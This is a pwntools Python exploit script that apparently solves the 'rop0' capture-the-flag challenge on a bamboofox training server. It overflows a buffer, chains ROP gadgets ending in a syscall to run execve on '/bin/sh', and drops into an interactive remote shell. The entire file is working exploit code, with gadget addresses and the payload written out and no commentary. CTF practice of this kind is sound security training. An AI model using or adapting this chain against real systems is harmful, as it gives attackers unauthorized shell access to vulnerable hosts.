from pwn import *

#r = process("./rop0")
r = remote("bamboofox.cs.nctu.edu.tw",12016)

r.send('/bin/sh\x00')

r.recvline()

'''
401516 : pop rdi ; ret
442909 : pop rdx ; pop rsi ; ret
478616 : pop rax ; pop rdx ; pop rbx ; ret
4672b5 : syscall ; ret
'''

p = 'a'*(0x20+0x8)
p += p64(0x401516) #6
p += p64(0x6CCD60) #1
p += p64(0x478616) #2
p += p64(59) #5
p += p64(0x0) #3
p += p64(0x0) #8
p += p64(0x442909) #4
p += p64(0x0) #9
p += p64(0x0) #10
p += p64(0x4672b5) #7

r.send(p)

r.interactive()